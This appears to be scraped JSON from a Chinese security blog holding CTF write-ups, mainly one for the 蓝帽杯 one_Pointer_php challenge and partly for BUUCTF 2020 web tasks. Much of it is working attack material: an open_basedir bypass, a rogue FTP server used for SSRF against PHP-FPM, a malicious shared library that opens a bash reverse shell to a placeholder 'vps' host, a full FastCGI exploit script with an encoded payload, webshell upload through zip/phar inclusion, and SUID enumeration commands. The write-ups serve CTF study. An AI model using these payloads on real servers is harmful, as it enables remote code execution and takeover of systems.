[Crypto]hpcurvehttps://jsur.in/posts/2020-12-21-hxp-ctf-2020-hyper-writeup","categories":[{"name":"CTF","slug":"CTF","permalink":"https://v1sun.github.io/categories/CTF/"}],"tags":[{"name":"Writeup","slug":"Writeup","permalink":"https://v1sun.github.io/tags/Writeup/"},{"name":"ctf","slug":"ctf","permalink":"https://v1sun.github.io/tags/ctf/"}]},{"title":"第五届蓝帽杯-one_Pointer_php复现","slug":"第五届蓝帽杯-one_Pointer_php复现","date":"2021-05-03T06:00:00.000Z","updated":"2021-05-11T09:50:52.080Z","comments":true,"path":"2021/05/03/第五届蓝帽杯-one_Pointer_php复现/","link":"","permalink":"https://v1sun.github.io/2021/05/03/%E7%AC%AC%E4%BA%94%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF-one_Pointer_php%E5%A4%8D%E7%8E%B0/","excerpt":"","text":"第五届蓝帽杯-one_Pointer_php复现 很有意思的一道题目，只有北邮的大佬解出来了。 整数溢出下载源码审计： 12345678910111213141516&lt;?phpinclude &quot;user.php&quot;;if($user=unserialize($_COOKIE[&quot;data&quot;]))&#123; $count[++$user-&gt;count]=1; if($count[]=1)&#123; $user-&gt;count+=1; setcookie(&quot;data&quot;,serialize($user)); &#125;else&#123; eval($_GET[&quot;backdoor&quot;]); &#125;&#125;else&#123; $user=new User; $user-&gt;count=1; setcookie(&quot;data&quot;,serialize($user));&#125;?&gt; 发现会对COOKIE的data值进行反序列化，满足条件才可以调用backdoor 关键点在if($count[]=1) 需要让其返回false才能跳出if循环，利用 long类型最大值绕过：即整数溢出 传入的数组键名超过PHP最大数字时，就会溢出为0 当溢出为0，赋值语句返回false。 构造payload： 1234567891011&lt;?phpclass User&#123; public $count;&#125;$v = new User();$v-&gt;count=&quot;9223372036854775806&quot;;echo serialize($v);echo &quot;\\r\\n&quot;;echo urlencode(serialize($v));?&gt; 12O:4:&quot;User&quot;:1:&#123;s:5:&quot;count&quot;;s:19:&quot;9223372036854775806&quot;;&#125;O%3A4%3A%22User%22%3A1%3A%7Bs%3A5%3A%22count%22%3Bs%3A19%3A%229223372036854775806%22%3B%7D 伪造Cookie，看下phpinfo： php版本7.4 ，同时发现需要bypas disable_functions，想到FFI bypass。 尝试了各种bypas disable_functions 都不可以。。。。。 绕过open_basedir绕过open_basedir 看下flag位置： 1chdir(&#39;&#x2F;tmp&#39;);mkdir(&#39;vvv&#39;);chdir(&#39;vvv&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);var_dump(ini_get(&#39;open_basedir&#39;));var_dump(glob(&#39;*&#39;)); flag在根目录下，读取失败，但是可以读取其他任意文件，看下文件权限： 可见flag文件700权限，可见限制了/flag文件的权限，无法读取 尝试读取下php配置文件： FFI bypass不能利用。发现有个so文件： 猜测预期解应该是pwn这个so文件 bypass。 任意文件写入通过测试发现可以写入任意文件： 1backdoor&#x3D;chdir(&#39;&#x2F;tmp&#39;);mkdir(&#39;vvv&#39;);chdir(&#39;vvv&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);var_dump(ini_get(&#39;open_basedir&#39;));file_put_contents(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;v.php&#39;,&#39;testetsttetst&#39;); 1backdoor&#x3D;chdir(&#39;&#x2F;tmp&#39;);mkdir(&#39;vvv&#39;);chdir(&#39;vvv&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);var_dump(ini_get(&#39;open_basedir&#39;));var_dump(file_get_contents(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;v.php&#39;)); 攻击PHP-FPM通过phpinfo发现是fastcgi ，读配置文件： 1&#x2F;etc&#x2F;nginx&#x2F;sites-enabled&#x2F;default 可见php-fpm监听在本地的9001端口。这样就可以尝试攻击FPM来RCE。 但是现在需要找到一个类似Gopher的协议，来实现SSRF 攻击FPM。 SSRF via file_put_contents前边我们说到可以任意文件写入，那么就可以利用 file_put_contents 函数，用法在hxp CTF已经考察过。思路是，通过任意文件写入一个file_put_contents函数到php文件，然后配合FTP实现SSRF FTP有两种使用模式：主动和被动。主动模式要求客户端和服务器端同时打开并且监听一个端口以创建连接。在这种情况下，客户端由于安装了防火墙会产生一些问题。所以，创立了被动模式。被动模式只要求服务器端产生一个监听相应端口的进程，这样就可以绕过客户端安装了防火墙的问题。 非常重要的一点, 这个被动模式的端口是服务器指定的, 而且还有一点是很多地方没有提到的, 实际上除了端口, 服务器的地址也是可以被指定的. file_put_contents 在使用 ftp 协议时, 会将 data 的内容上传到 ftp 服务器, 由于上面说的 pasv 模式下, 服务器的地址和端口是可控, 我们可以将地址和端口指到 127.0.0.1:9000. 同时由于 ftp 的特性, 不会有任何的多余内容, 类似 gopher 协议, 会将 data 原封不动的发给 127.0.0.1:9000, 完美符合攻击 fastcgi 的要求. 之后利用file_put_contents函数： 1file&#x3D;ftp:&#x2F;&#x2F;vps:port&#x2F;anything&amp;data&#x3D;&#123;fastcgi payload&#125; 因为ftp的地址和端口是我们可控的，指定为本地的9001端口，也就是FPM的监听端口，因此构造的攻击fastcgi payload会发送到FPM 达到攻击的目的。 利用过程按照Ha1c9on师傅的思路是通过加载so文件的方式攻击fastcgi。 构造恶意ftp服务器构造恶意ftp服务器，指定地址为本地的9001端口，结合file_put_contents达到SSRF的目的。 12345678910111213141516171819202122232425262728//evil_ftp.pyimport sockets = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.bind((&#x27;0.0.0.0&#x27;, 23))s.listen(1)conn, addr = s.accept()conn.send(b&#x27;220 welcome\\n&#x27;)#Service ready for new user.#Client send anonymous username#USER anonymousconn.send(b&#x27;331 Please specify the password.\\n&#x27;)#User name okay, need password.#Client send anonymous password.#PASS anonymousconn.send(b&#x27;230 Login successful.\\n&#x27;)#User logged in, proceed. Logged out if appropriate.#TYPE Iconn.send(b&#x27;200 Switching to Binary mode.\\n&#x27;)#Size /conn.send(b&#x27;550 Could not get the file size.\\n&#x27;)#EPSV (1)conn.send(b&#x27;150 ok\\n&#x27;)#PASVconn.send(b&#x27;227 Entering Extended Passive Mode (127,0,0,1,0,9001)\\n&#x27;) #STOR / (2)conn.send(b&#x27;150 Permission denied.\\n&#x27;)#QUITconn.send(b&#x27;221 Goodbye.\\n&#x27;)conn.close() 构造恶意so文件反弹shell写一个扩展，直接反弹shell： 123456789//evil.c#define _GNU_SOURCE#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;__attribute__ ((__constructor__)) void preload (void)&#123; system(&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/vps/port 0&gt;&amp;1&#x27;&quot;);&#125; 编译evil.c文件，得到evil.so： 1gcc evil.c -fPIC -shared -o evil.so 将so文件上传到/tmp目录： 12copy(&#39;http:&#x2F;&#x2F;vps&#x2F;evil.so&#39;,&#39;&#x2F;tmp&#x2F;evil.so&#39;);var_dump(glob(&#39;&#x2F;tmp&#x2F;*&#39;)); Fastcgi攻击payload攻击fastcgi的脚本，加载evil.so文件： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350&lt;?php/** * Note : Code is released under the GNU LGPL * * Please do not change the header of this file * * This library is free software; you can redistribute it and/or modify it under the terms of the GNU * Lesser General Public License as published by the Free Software Foundation; either version 2 of * the License, or (at your option) any later version. * * This library is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; * without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. * * See the GNU Lesser General Public License for more details. *//** * Handles communication with a FastCGI application * * @author Pierrick Charron &lt;pierrick@webstart.fr&gt; * @version 1.0 */class FCGIClient&#123; const VERSION_1 = 1; const BEGIN_REQUEST = 1; const ABORT_REQUEST = 2; const END_REQUEST = 3; const PARAMS = 4; const STDIN = 5; const STDOUT = 6; const STDERR = 7; const DATA = 8; const GET_VALUES = 9; const GET_VALUES_RESULT = 10; const UNKNOWN_TYPE = 11; const MAXTYPE = self::UNKNOWN_TYPE; const RESPONDER = 1; const AUTHORIZER = 2; const FILTER = 3; const REQUEST_COMPLETE = 0; const CANT_MPX_CONN = 1; const OVERLOADED = 2; const UNKNOWN_ROLE = 3; const MAX_CONNS = &#x27;MAX_CONNS&#x27;; const MAX_REQS = &#x27;MAX_REQS&#x27;; const MPXS_CONNS = &#x27;MPXS_CONNS&#x27;; const HEADER_LEN = 8; /** * Socket * @var Resource */ private $_sock = null; /** * Host * @var String */ private $_host = null; /** * Port * @var Integer */ private $_port = null; /** * Keep Alive * @var Boolean */ private $_keepAlive = false; /** * Constructor * * @param String $host Host of the FastCGI application * @param Integer $port Port of the FastCGI application */ public function __construct($host, $port = 9001) // and default value for port, just for unixdomain socket &#123; $this-&gt;_host = $host; $this-&gt;_port = $port; &#125; /** * Define whether or not the FastCGI application should keep the connection * alive at the end of a request * * @param Boolean $b true if the connection should stay alive, false otherwise */ public function setKeepAlive($b) &#123; $this-&gt;_keepAlive = (boolean)$b; if (!$this-&gt;_keepAlive &amp;&amp; $this-&gt;_sock) &#123; fclose($this-&gt;_sock); &#125; &#125; /** * Get the keep alive status * * @return Boolean true if the connection should stay alive, false otherwise */ public function getKeepAlive() &#123; return $this-&gt;_keepAlive; &#125; /** * Create a connection to the FastCGI application */ private function connect() &#123; if (!$this-&gt;_sock) &#123; //$this-&gt;_sock = fsockopen($this-&gt;_host, $this-&gt;_port, $errno, $errstr, 5); $this-&gt;_sock = stream_socket_client($this-&gt;_host, $errno, $errstr, 5); if (!$this-&gt;_sock) &#123; throw new Exception(&#x27;Unable to connect to FastCGI application&#x27;); &#125; &#125; &#125; /** * Build a FastCGI packet * * @param Integer $type Type of the packet * @param String $content Content of the packet * @param Integer $requestId RequestId */ private function buildPacket($type, $content, $requestId = 1) &#123; $clen = strlen($content); return chr(self::VERSION_1) /* version */ . chr($type) /* type */ . chr(($requestId &gt;&gt; 8) &amp; 0xFF) /* requestIdB1 */ . chr($requestId &amp; 0xFF) /* requestIdB0 */ . chr(($clen &gt;&gt; 8 ) &amp; 0xFF) /* contentLengthB1 */ . chr($clen &amp; 0xFF) /* contentLengthB0 */ . chr(0) /* paddingLength */ . chr(0) /* reserved */ . $content; /* content */ &#125; /** * Build an FastCGI Name value pair * * @param String $name Name * @param String $value Value * @return String FastCGI Name value pair */ private function buildNvpair($name, $value) &#123; $nlen = strlen($name); $vlen = strlen($value); if ($nlen &lt; 128) &#123; /* nameLengthB0 */ $nvpair = chr($nlen); &#125; else &#123; /* nameLengthB3 &amp; nameLengthB2 &amp; nameLengthB1 &amp; nameLengthB0 */ $nvpair = chr(($nlen &gt;&gt; 24) | 0x80) . chr(($nlen &gt;&gt; 16) &amp; 0xFF) . chr(($nlen &gt;&gt; 8) &amp; 0xFF) . chr($nlen &amp; 0xFF); &#125; if ($vlen &lt; 128) &#123; /* valueLengthB0 */ $nvpair .= chr($vlen); &#125; else &#123; /* valueLengthB3 &amp; valueLengthB2 &amp; valueLengthB1 &amp; valueLengthB0 */ $nvpair .= chr(($vlen &gt;&gt; 24) | 0x80) . chr(($vlen &gt;&gt; 16) &amp; 0xFF) . chr(($vlen &gt;&gt; 8) &amp; 0xFF) . chr($vlen &amp; 0xFF); &#125; /* nameData &amp; valueData */ return $nvpair . $name . $value; &#125; /** * Read a set of FastCGI Name value pairs * * @param String $data Data containing the set of FastCGI NVPair * @return array of NVPair */ private function readNvpair($data, $length = null) &#123; $array = array(); if ($length === null) &#123; $length = strlen($data); &#125; $p = 0; while ($p != $length) &#123; $nlen = ord($data&#123;$p++&#125;); if ($nlen &gt;= 128) &#123; $nlen = ($nlen &amp; 0x7F &lt;&lt; 24); $nlen |= (ord($data&#123;$p++&#125;) &lt;&lt; 16); $nlen |= (ord($data&#123;$p++&#125;) &lt;&lt; 8); $nlen |= (ord($data&#123;$p++&#125;)); &#125; $vlen = ord($data&#123;$p++&#125;); if ($vlen &gt;= 128) &#123; $vlen = ($nlen &amp; 0x7F &lt;&lt; 24); $vlen |= (ord($data&#123;$p++&#125;) &lt;&lt; 16); $vlen |= (ord($data&#123;$p++&#125;) &lt;&lt; 8); $vlen |= (ord($data&#123;$p++&#125;)); &#125; $array[substr($data, $p, $nlen)] = substr($data, $p+$nlen, $vlen); $p += ($nlen + $vlen); &#125; return $array; &#125; /** * Decode a FastCGI Packet * * @param String $data String containing all the packet * @return array */ private function decodePacketHeader($data) &#123; $ret = array(); $ret[&#x27;version&#x27;] = ord($data&#123;0&#125;); $ret[&#x27;type&#x27;] = ord($data&#123;1&#125;); $ret[&#x27;requestId&#x27;] = (ord($data&#123;2&#125;) &lt;&lt; 8) + ord($data&#123;3&#125;); $ret[&#x27;contentLength&#x27;] = (ord($data&#123;4&#125;) &lt;&lt; 8) + ord($data&#123;5&#125;); $ret[&#x27;paddingLength&#x27;] = ord($data&#123;6&#125;); $ret[&#x27;reserved&#x27;] = ord($data&#123;7&#125;); return $ret; &#125; /** * Read a FastCGI Packet * * @return array */ private function readPacket() &#123; if ($packet = fread($this-&gt;_sock, self::HEADER_LEN)) &#123; $resp = $this-&gt;decodePacketHeader($packet); $resp[&#x27;content&#x27;] = &#x27;&#x27;; if ($resp[&#x27;contentLength&#x27;]) &#123; $len = $resp[&#x27;contentLength&#x27;]; while ($len &amp;&amp; $buf=fread($this-&gt;_sock, $len)) &#123; $len -= strlen($buf); $resp[&#x27;content&#x27;] .= $buf; &#125; &#125; if ($resp[&#x27;paddingLength&#x27;]) &#123; $buf=fread($this-&gt;_sock, $resp[&#x27;paddingLength&#x27;]); &#125; return $resp; &#125; else &#123; return false; &#125; &#125; /** * Get Informations on the FastCGI application * * @param array $requestedInfo information to retrieve * @return array */ public function getValues(array $requestedInfo) &#123; $this-&gt;connect(); $request = &#x27;&#x27;; foreach ($requestedInfo as $info) &#123; $request .= $this-&gt;buildNvpair($info, &#x27;&#x27;); &#125; fwrite($this-&gt;_sock, $this-&gt;buildPacket(self::GET_VALUES, $request, 0)); $resp = $this-&gt;readPacket(); if ($resp[&#x27;type&#x27;] == self::GET_VALUES_RESULT) &#123; return $this-&gt;readNvpair($resp[&#x27;content&#x27;], $resp[&#x27;length&#x27;]); &#125; else &#123; throw new Exception(&#x27;Unexpected response type, expecting GET_VALUES_RESULT&#x27;); &#125; &#125; /** * Execute a request to the FastCGI application * * @param array $params Array of parameters * @param String $stdin Content * @return String */ public function request(array $params, $stdin) &#123; $response = &#x27;&#x27;;// $this-&gt;connect(); $request = $this-&gt;buildPacket(self::BEGIN_REQUEST, chr(0) . chr(self::RESPONDER) . chr((int) $this-&gt;_keepAlive) . str_repeat(chr(0), 5)); $paramsRequest = &#x27;&#x27;; foreach ($params as $key =&gt; $value) &#123; $paramsRequest .= $this-&gt;buildNvpair($key, $value); &#125; if ($paramsRequest) &#123; $request .= $this-&gt;buildPacket(self::PARAMS, $paramsRequest); &#125; $request .= $this-&gt;buildPacket(self::PARAMS, &#x27;&#x27;); if ($stdin) &#123; $request .= $this-&gt;buildPacket(self::STDIN, $stdin); &#125; $request .= $this-&gt;buildPacket(self::STDIN, &#x27;&#x27;); echo(&#x27;data=&#x27;.urlencode($request));// fwrite($this-&gt;_sock, $request);// do &#123;// $resp = $this-&gt;readPacket();// if ($resp[&#x27;type&#x27;] == self::STDOUT || $resp[&#x27;type&#x27;] == self::STDERR) &#123;// $response .= $resp[&#x27;content&#x27;];// &#125;// &#125; while ($resp &amp;&amp; $resp[&#x27;type&#x27;] != self::END_REQUEST);// var_dump($resp);// if (!is_array($resp)) &#123;// throw new Exception(&#x27;Bad request&#x27;);// &#125;// switch (ord($resp[&#x27;content&#x27;]&#123;4&#125;)) &#123;// case self::CANT_MPX_CONN:// throw new Exception(&#x27;This app can\\&#x27;t multiplex [CANT_MPX_CONN]&#x27;);// break;// case self::OVERLOADED:// throw new Exception(&#x27;New request rejected; too busy [OVERLOADED]&#x27;);// break;// case self::UNKNOWN_ROLE:// throw new Exception(&#x27;Role value not known [UNKNOWN_ROLE]&#x27;);// break;// case self::REQUEST_COMPLETE:// return $response;// &#125; &#125;&#125;?&gt;&lt;?php// real exploit start here//if (!isset($_REQUEST[&#x27;cmd&#x27;])) &#123;// die(&quot;Check your input\\n&quot;);//&#125;//if (!isset($_REQUEST[&#x27;filepath&#x27;])) &#123;// $filepath = __FILE__;//&#125;else&#123;// $filepath = $_REQUEST[&#x27;filepath&#x27;];//&#125;$filepath = &quot;/var/www/html/add_api.php&quot;;$req = &#x27;/&#x27;.basename($filepath);$uri = $req .&#x27;?&#x27;.&#x27;command=whoami&#x27;;$client = new FCGIClient(&quot;unix:///var/run/php-fpm.sock&quot;, -1);$code = &quot;&lt;?php system(\\$_REQUEST[&#x27;command&#x27;]); phpinfo(); ?&gt;&quot;; // php payload -- Doesnt do anything$php_value = &quot;unserialize_callback_func = system\\nextension_dir = /tmp\\nextension = evil.so\\ndisable_classes = \\ndisable_functions = \\nallow_url_include = On\\nopen_basedir = /\\nauto_prepend_file = &quot;;$params = array( &#x27;GATEWAY_INTERFACE&#x27; =&gt; &#x27;FastCGI/1.0&#x27;, &#x27;REQUEST_METHOD&#x27; =&gt; &#x27;POST&#x27;, &#x27;SCRIPT_FILENAME&#x27; =&gt; $filepath, &#x27;SCRIPT_NAME&#x27; =&gt; $req, &#x27;QUERY_STRING&#x27; =&gt; &#x27;command=whoami&#x27;, &#x27;REQUEST_URI&#x27; =&gt; $uri, &#x27;DOCUMENT_URI&#x27; =&gt; $req,#&#x27;DOCUMENT_ROOT&#x27; =&gt; &#x27;/&#x27;, &#x27;PHP_VALUE&#x27; =&gt; $php_value, &#x27;SERVER_SOFTWARE&#x27; =&gt; &#x27;80sec/wofeiwo&#x27;, &#x27;REMOTE_ADDR&#x27; =&gt; &#x27;127.0.0.1&#x27;, &#x27;REMOTE_PORT&#x27; =&gt; &#x27;9001&#x27;, &#x27;SERVER_ADDR&#x27; =&gt; &#x27;127.0.0.1&#x27;, &#x27;SERVER_PORT&#x27; =&gt; &#x27;80&#x27;, &#x27;SERVER_NAME&#x27; =&gt; &#x27;localhost&#x27;, &#x27;SERVER_PROTOCOL&#x27; =&gt; &#x27;HTTP/1.1&#x27;, &#x27;CONTENT_LENGTH&#x27; =&gt; strlen($code));// print_r($_REQUEST);// print_r($params);//echo &quot;Call: $uri\\n\\n&quot;;echo $client-&gt;request($params, $code).&quot;\\n&quot;;?&gt; 12&#x2F;&#x2F;payloaddata&#x3D;%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%02%3C%00%00%11%0BGATEWAY_INTERFACEFastCGI%2F1.0%0E%04REQUEST_METHODPOST%0F%19SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Fadd_api.php%0B%0CSCRIPT_NAME%2Fadd_api.php%0C%0EQUERY_STRINGcommand%3Dwhoami%0B%1BREQUEST_URI%2Fadd_api.php%3Fcommand%3Dwhoami%0C%0CDOCUMENT_URI%2Fadd_api.php%09%80%00%00%B0PHP_VALUEunserialize_callback_func+%3D+system%0Aextension_dir+%3D+%2Ftmp%0Aextension+%3D+evil.so%0Adisable_classes+%3D+%0Adisable_functions+%3D+%0Aallow_url_include+%3D+On%0Aopen_basedir+%3D+%2F%0Aauto_prepend_file+%3D+%0F%0DSERVER_SOFTWARE80sec%2Fwofeiwo%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9000%0B%09SERVER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP%2F1.1%0E%02CONTENT_LENGTH49%01%04%00%01%00%00%00%00%01%05%00%01%001%00%00%3C%3Fphp+system%28%24_REQUEST%5B%27command%27%5D%29%3B+phpinfo%28%29%3B+%3F%3E%01%05%00%01%00%00%00%00 12&#x2F;&#x2F;payloadbackdoor&#x3D;$file &#x3D; $_GET[&#39;file&#39;];$data &#x3D; $_GET[&#39;data&#39;];file_put_contents($file,$data);&amp;file&#x3D;ftp:&#x2F;&#x2F;aaa@vps:port&#x2F;123&amp;data&#x3D;%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%02%3C%00%00%11%0BGATEWAY_INTERFACEFastCGI%2F1.0%0E%04REQUEST_METHODPOST%0F%19SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Fadd_api.php%0B%0CSCRIPT_NAME%2Fadd_api.php%0C%0EQUERY_STRINGcommand%3Dwhoami%0B%1BREQUEST_URI%2Fadd_api.php%3Fcommand%3Dwhoami%0C%0CDOCUMENT_URI%2Fadd_api.php%09%80%00%00%B0PHP_VALUEunserialize_callback_func+%3D+system%0Aextension_dir+%3D+%2Ftmp%0Aextension+%3D+evil.so%0Adisable_classes+%3D+%0Adisable_functions+%3D+%0Aallow_url_include+%3D+On%0Aopen_basedir+%3D+%2F%0Aauto_prepend_file+%3D+%0F%0DSERVER_SOFTWARE80sec%2Fwofeiwo%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9000%0B%09SERVER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP%2F1.1%0E%02CONTENT_LENGTH49%01%04%00%01%00%00%00%00%01%05%00%01%001%00%00%3C%3Fphp+system%28%24_REQUEST%5B%27command%27%5D%29%3B+phpinfo%28%29%3B+%3F%3E%01%05%00%01%00%00%00%00 之后就反弹回来shell： 但是不能cat /flag，接下来提权。 SUID提权12345查看具有root权限的SUID文件：find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;nullfind &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;nullfind &#x2F; -user root -perm -4000 -exec ls -ldb &#123;&#125; ;或者sudo -l 命令列出当前用户可执行的命令 可以利用php进行读取： 1chdir(&#39;&#x2F;tmp&#39;);mkdir(&#39;vvv&#39;);chdir(&#39;vvv&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);var_dump(ini_get(&#39;open_basedir&#39;));echo file_get_contents(&#39;&#x2F;flag&#39;); 参考文章蓝帽杯_one_Pointer_php hxp CTF resonator Writeup - SSRF via file_put_contents HXP resonator(利用file_put_contents打SSRF) 从一道CTF学习Fastcgi绕过姿势 浅析php-fpm的攻击方式","categories":[{"name":"CTF","slug":"CTF","permalink":"https://v1sun.github.io/categories/CTF/"}],"tags":[{"name":"Writeup","slug":"Writeup","permalink":"https://v1sun.github.io/tags/Writeup/"},{"name":"ctf","slug":"ctf","permalink":"https://v1sun.github.io/tags/ctf/"}]},{"title":"BUUCTF-2020极客大挑战","slug":"BUUCTF-2020极客大挑战","date":"2021-04-21T12:15:00.000Z","updated":"2021-05-11T09:49:51.854Z","comments":true,"path":"2021/04/21/BUUCTF-2020极客大挑战/","link":"","permalink":"https://v1sun.github.io/2021/04/21/BUUCTF-2020%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/","excerpt":"","text":"BUUCTF-2020极客大挑战[WEB]Welcome题目访问不了，bp抓包，响应头显示： 改为post请求： 数组绕过sha1：roam1[]=1&amp;roam2[]=2 phpinfo()页面搜索flag： [WEB]myblog打开题目看到url，猜测存在伪协议读取文件，没有读到index 读到了login.php： 1?page&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;login 12345678910//secret.php&lt;?php$secret_seed = mt_rand();?&gt;//login.php&lt;?phprequire_once(&quot;secret.php&quot;);mt_srand($secret_seed);$_SESSION[&#x27;password&#x27;] = mt_rand();?&gt; 看到传入的username&amp;password进入了/?page=admin/user，读取一下： 123456789101112131415&lt;?phperror_reporting(0);session_start();$logined = false;if (isset($_POST[&#x27;username&#x27;]) and isset($_POST[&#x27;password&#x27;]))&#123; if ($_POST[&#x27;username&#x27;] === &quot;Longlone&quot; and $_POST[&#x27;password&#x27;] == $_SESSION[&#x27;password&#x27;])&#123; // No one knows my password, including myself $logined = true; $_SESSION[&#x27;status&#x27;] = $logined; &#125;&#125;if ($logined === false &amp;&amp; !isset($_SESSION[&#x27;status&#x27;]) || $_SESSION[&#x27;status&#x27;] !== true)&#123; echo &quot;&lt;script&gt;alert(&#x27;username or password not correct!&#x27;);window.location.href=&#x27;index.php?page=login&#x27;;&lt;/script&gt;&quot;; die();&#125;?&gt; 通过关键代码可知用户名为Longlone，密码为随机数验证通过会进入admin目录，可见在验证密码的时候采用== ，我们可以通过清空session 然后密码为空绕过： 成功登陆。 接下来审计读到的其他代码： 12345678910111213141516&lt;?php if(isset($_FILES[&#x27;Files&#x27;]) and $_SESSION[&#x27;status&#x27;] === true)&#123; $tmp_file = $_FILES[&#x27;Files&#x27;][&#x27;name&#x27;]; $tmp_path = $_FILES[&#x27;Files&#x27;][&#x27;tmp_name&#x27;]; if(($extension = pathinfo($tmp_file)[&#x27;extension&#x27;]) != &quot;&quot;)&#123; $allows = array(&#x27;gif&#x27;,&#x27;jpeg&#x27;,&#x27;jpg&#x27;,&#x27;png&#x27;); if(in_array($extension,$allows,true) and in_array($_FILES[&#x27;Files&#x27;][&#x27;type&#x27;],array_map(function($ext)&#123;return &#x27;image/&#x27;.$ext;&#125;,$allows),true))&#123; $upload_name = sha1(md5(uniqid(microtime(true), true))).&#x27;.&#x27;.$extension; move_uploaded_file($tmp_path,&quot;assets/img/upload/&quot;.$upload_name); echo &quot;&lt;script&gt;alert(&#x27;Update image -&gt; assets/img/upload/$&#123;upload_name&#125;&#x27;) &lt;/script&gt;&quot;; &#125; else &#123; echo &quot;&lt;script&gt;alert(&#x27;Update illegal! Only allows like \\&#x27;gif\\&#x27;, \\&#x27;jpeg\\&#x27;, \\&#x27;jpg\\&#x27;, \\&#x27;png\\&#x27; &#x27;) &lt;/script&gt;&quot;; &#125; &#125; &#125; ?&gt; 看到存在这么一段代码，文件上传，采用的是白名单，想到首页的文件包含，我们可以文件包含配合上传图片getshell，但是通过我们伪协议读取源码得知包含的时候会加上.php后缀，因此通过zip:// 或者phar://协议来包含。利用过程： 1一句话木马-&gt;压缩为zip文件-&gt;修改后缀的jpg-&gt;利用zip:&#x2F;&#x2F;或者phar:&#x2F;&#x2F;协议包含-&gt;getshell 先传phpinfo测试，上传后路径： 1.&#x2F;assets&#x2F;img&#x2F;upload&#x2F;a4c4ab7e86ffb8ae7ebf44a377492d0b073e3b45.jpg 1page&#x3D;zip:&#x2F;&#x2F;.&#x2F;assets&#x2F;img&#x2F;upload&#x2F;a4c4ab7e86ffb8ae7ebf44a377492d0b073e3b45.jpg%231 然后上传一句话木马： 利用phar协议： 1page&#x3D;phar:&#x2F;&#x2F;.&#x2F;assets&#x2F;img&#x2F;upload&#x2F;7f9dd8cedfae86b489906d5126b1ccad949bb11b.jpg&#x2F;1 [WEB]rceme 执行命令前有一个验证，python脚本构造即可。查看源码发现提示 存在swp文件泄露： 下载恢复文件： 12345678910111213141516171819202122&lt;?phperror_reporting(0);session_start();if(!isset($_SESSION[&#x27;code&#x27;]))&#123; $_SESSION[&#x27;code&#x27;] = substr(md5(mt_rand().sha1(mt_rand)),0,5);&#125;if(isset($_POST[&#x27;cmd&#x27;]) and isset($_POST[&#x27;code&#x27;]))&#123; if(substr(md5($_POST[&#x27;code&#x27;]),0,5) !== $_SESSION[&#x27;code&#x27;])&#123; die(&#x27;&lt;script&gt;alert(\\&#x27;Captcha error~\\&#x27;);history.back()&lt;/script&gt;&#x27;); &#125; $_SESSION[&#x27;code&#x27;] = substr(md5(mt_rand().sha1(mt_rand)),0,5); $code = $_POST[&#x27;cmd&#x27;]; if(strlen($code) &gt; 70 or preg_match(&#x27;/[A-Za-z0-9]|\\&#x27;|&quot;|`|\\ |,|\\.|-|\\+|=|\\/|\\\\|&lt;|&gt;|\\$|\\?|\\^|&amp;|\\|/ixm&#x27;,$code))&#123; die(&#x27;&lt;script&gt;alert(\\&#x27;Longlone not like you~\\&#x27;);history.back()&lt;/script&gt;&#x27;); &#125;else if(&#x27;;&#x27; === preg_replace(&#x27;/[^\\s\\(\\)]+?\\((?R)?\\)/&#x27;, &#x27;&#x27;, $code))&#123; @eval($code); die(); &#125;&#125;?&gt; RCE限制长度小于等于70位 限制特殊符号数字字母，不能用异或和或运算 —可以利用取反 只允许无参数的函数传递进来，函数名只能为字母—利用无参数RCE 关于无参数RCE不再详细分析，可参考：https://xz.aliyun.com/t/9360 这里利用getallheaders() 先看一下位置： 